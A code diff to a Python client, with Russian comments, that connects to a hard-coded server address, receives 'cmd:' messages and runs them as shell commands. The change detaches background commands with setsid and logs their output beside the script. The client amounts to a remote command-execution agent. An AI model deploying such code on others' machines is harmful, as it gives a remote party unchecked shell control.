@@ -3,6 +3,7 @@ import subprocess
 import os
 import sys
 import time
+import re
 
 SERVER_IP = "192.168.100.3"  # Установите IP сервера
 SERVER_PORT = 5000
@@ -52,33 +53,29 @@ def main():
                 if command.startswith("cmd:"):
                     cmd = command[4:].strip()
 
-                    # Обработка команд с nohup/фоновым запуском - заменяем на setsid с логами
+                    # Обработка команд с nohup/фоновых через setsid и с указанием директории скрипта
                     if "nohup" in cmd or cmd.endswith('&'):
                         try:
-                            # Пример запуска через setsid, лог в /tmp/asda.log
-                            # Здесь подставляем нужный путь к python3 и скрипту
-                            log_file = "/tmp/asda.log"
-
-                            # Разбиваем команду на части, выделяем путь до скрипта, если нужно
-                            # Для простоты — если в команде 'python3 "путь"', просто подставим setsid для нейтрализации nohup и &
-                            # Для универсальности можно обрабатывать отдельно, но пока так
-
-                            # Пример: если cmd содержит python3 и путь к файлу, выделим его
-                            # И сформируем новую команду
-                            import re
+                            # Найдём путь скрипта в команде, если есть python3 "путь"
                             m = re.search(r'python3\s+"([^"]+)"', cmd)
                             if m:
                                 script_path = m.group(1)
-                                python_path = "/usr/bin/python3"  # или путь из which python3
-                                run_cmd = f'setsid {python_path} "{script_path}" > {log_file} 2>&1 < /dev/null &'
+                                script_dir = os.path.dirname(script_path)
+                                log_file = os.path.join(script_dir, "asda.log")
+                                # Формируем команду с setsid и выводом лога в asda.log
+                                run_cmd = (
+                                    f'setsid python3 "{script_path}" > "{log_file}" 2>&1 < /dev/null &'
+                                )
                             else:
-                                # Если не нашли — запуск как есть с setsid
-                                run_cmd = f'setsid {cmd} > {log_file} 2>&1 < /dev/null &'
+                                # Если не нашли, запускаем как есть, cwd - текущая директория клиента
+                                script_dir = os.getcwd()
+                                log_file = os.path.join(script_dir, "asda.log")
+                                run_cmd = f'setsid {cmd} > "{log_file}" 2>&1 < /dev/null &'
 
                             subprocess.Popen(
                                 run_cmd,
                                 shell=True,
-                                cwd=os.getcwd()
+                                cwd=script_dir
                             )
                             s.send("Команда запущена через setsid с логированием.".encode())
                         except Exception as e:
